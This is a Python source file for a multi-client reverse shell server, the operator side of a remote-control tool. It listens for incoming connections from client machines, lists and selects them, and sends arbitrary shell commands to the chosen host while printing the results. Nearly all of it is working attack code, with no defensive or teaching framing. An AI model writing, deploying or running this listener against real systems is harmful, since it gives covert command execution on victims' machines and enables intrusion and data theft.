import click
import socket
import sys
import threading

from queue import Queue


# Threads for multi-client support
NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
job_queue = Queue()


class ShellService:
    """Class used to create and control a reverse shell service"""

    def __init__(self, host, port):
        self.host = host
        self.port = port

        self.ENCODING = 'utf-8'
        self.HEADER_LENGTH = 10

        self.server_socket = None
        self.sockets_list = []
        self.address_list = []
        self.curr_conn_id = None

        # Commands recognized by server prompt
        self.server_commands = {
            '\n---Prompt Commands---': 'Commands recognized by the server prompt',
            'list': 'List all connected clients\n',
            'select': 'Select the client you want to manage\n'
                      + '\t[argument: Integer value corresponding to connection]',
            'exit()': 'Terminates the running server and removes all established connections\n\n'
        }

        # Commands recognized by client prompt
        self.client_commands = {
            '---Client Commands---': 'Special commands recognized by the client prompt',
            'remove': 'Removes the current client connection from the server\n',
            'quit': 'Returns back to the main prompt retaining\n'
                    + '\tthe connection with the selected client',
            'help': 'Display this help message\n'
        }

    def _send_command(self, sock, cmd):
        """Encodes and sends commands to the client"""
        # Form the command header
        command_header = f"{len(cmd): <{self.HEADER_LENGTH}}".encode(self.ENCODING)
        command = cmd.encode(self.ENCODING)

        # Send of the command data to the client
        sock.send(command_header + command)

    def _receive_response(self, sock):
        """Receives the command output from the client machine"""
        try:

            response_header = sock.recv(self.HEADER_LENGTH)

            if not response_header:
                return None

            response_length = int(response_header.decode(self.ENCODING).strip())
            response = sock.recv(response_length).decode(self.ENCODING)

            return response
        except:
            return None

    def _purge_connections(self):
        """Purges all existing connections"""
        for conn in self.sockets_list:
            try:
                # First send a message to each client
                # notifying them that the server is no longer available
                self._send_command(conn, 'remove')
                conn.shutdown(socket.SHUT_RDWR)
                conn.close()
            except socket.error:
                print("[-] A connection was already closed")

        del self.sockets_list[:]
        del self.address_list[:]

    def accept_connections(self):
        """Background thread accepting new connections"""
        # Remove any old and invalid connections
        self._purge_connections()

        # Continue accepting new connections
        while True:
            try:
                conn, addr = self.server_socket.accept()

                # Make the connection blocking
                conn.setblocking(True)
                self.sockets_list.append(conn)
                self.address_list.append(addr)
                print("\n[+] Accepted a new connection from {}:{}".format(*addr), end='')
            except KeyboardInterrupt:
                break

    def list_connections(self):
        """Lists all established connections for the user"""
        results = ''

        for id, conn in enumerate(self.sockets_list):

            # Ensure that the connection is valid
            try:
                self._send_command(conn, cmd='')
                self._receive_response(conn)

            except:
                # Delete the invalid connection
                del self.address_list[id]
                del self.sockets_list[id]

                continue

            results += str(id) + '    ' + str(self.address_list[id][0]) + '    ' + str(self.address_list[id][1]) + '\n'
        print('----- Clients -----' + '\n' + results)

    def send_target_commands(self, conn):
        """Handles command input"""
        while True:
            try:
                cmd = input()

                # User wants to remove the client connection
                if cmd == 'remove':
                    self._send_command(conn, cmd)

                    # Update the appropriate lists
                    indx = self.sockets_list.index(conn)
                    self.curr_conn_id = None
                    del self.sockets_list[indx]
                    del self.address_list[indx]
                    break

                # User wants to retain the client connection and
                # return to the main shell prompt
                elif cmd == 'quit':
                    self._send_command(conn, cmd)
                    self.curr_conn_id = None
                    break

                elif cmd == 'help':
                    self.display_help(self.client_commands)
                    print(str(self.curr_conn_id) + '> ', end='')
                    continue

                elif not cmd:
                    print(str(self.curr_conn_id) + '> ', end='')
                    continue

                if cmd:
                    self._send_command(conn, cmd)
                    client_response = self._receive_response(conn)

                    if client_response:
                        print(client_response, end='')
                    else:
                        print("[-] Connection lost\n")
                        self.curr_conn_id = None
                        break

            except Exception:
                print("[-] Connection lost\n")
                self.curr_conn_id = None
                break

    def select_connection(self, message):
        """Select a listed connection"""

        # First parse the selection message
        try:
            conn_id = message.replace('select ', '')
            conn_id = int(conn_id)

            # Find the desired connection object
            conn = self.sockets_list[conn_id]
            print(f"[+] Connected to {self.address_list[conn_id][0]}")
            print(str(self.address_list[conn_id][0]) + '> ', end='')
            self.curr_conn_id = self.address_list[conn_id][0]

            return conn

        except Exception:
            print("[-] Not a valid selection\n")
            return None

    def interactive_prompt(self):
        """Interactive prompt used to select and list connections"""
        while True:
            cmd = input('shell> ')

            if cmd == 'list':
                self.list_connections()

            elif cmd == 'clear':
                click.clear()

            # Parse input
            elif cmd == 'exit()':
                # Kill all connections
                self.stop()
                break

            elif 'select' in cmd:
                conn = self.select_connection(cmd)

                # Send commands if a valid connection was received
                if conn:
                    self.send_target_commands(conn)

            elif cmd == 'help':
                self.display_help(self.server_commands)

            elif cmd == '':
                pass
            else:
                print("[-] Command not recognized\n")
        return

    def job_handler(self):
        """
            Handles the jobs at hand.
            A job can either be acceptance of connections
            or the transmission of commands to a client.
        """
        while True:
            job = job_queue.get()

            # Handles the acceptance of new connections
            if job == 1:

                # Listen for new connections
                self.accept_connections()

            # Handles the transmission of commands
            elif job == 2:
                self.interactive_prompt()

            job_queue.task_done()

    def build_threads(self):
        """Generic function for defining the necessary threads"""
        for _ in range(NUMBER_OF_THREADS):
            thread = threading.Thread(target=self.job_handler)
            thread.daemon = True
            thread.start()

    @staticmethod
    def display_help(commands):
        """Displays a list of available commands"""
        for cmd, hlp in commands.items():
            print("{0} : {1}".format(cmd, hlp))

    @staticmethod
    def create_jobs():
        for job in JOB_NUMBER:
            job_queue.put(job)

        job_queue.join()

    def setup(self):
        """Configures the service"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.setblocking(True)
            self.server_socket.listen(5)

        except socket.error as msg:
            # Kill all daemons
            print("[!] Socket creation error: " + str(msg))
            self.server_socket.close()
            sys.exit()

        print(f"[+] Listening for connections on {self.host} : {self.port}...")

    def start(self):
        """Begin running the service"""
        # Initiate daemons
        self.setup()
        self.build_threads()
        self.create_jobs()

    def stop(self):
        print("\n[+] Closing all client connections...")
        self._purge_connections()

        print("[+] Shutting down all tasks...")
        # First end all tasks
        job_queue.task_done()
        job_queue.task_done()

        print("[+] Shutting down shell server...")
        self.server_socket.shutdown(socket.SHUT_RDWR)
        self.server_socket.close()
        print("[+] Done")
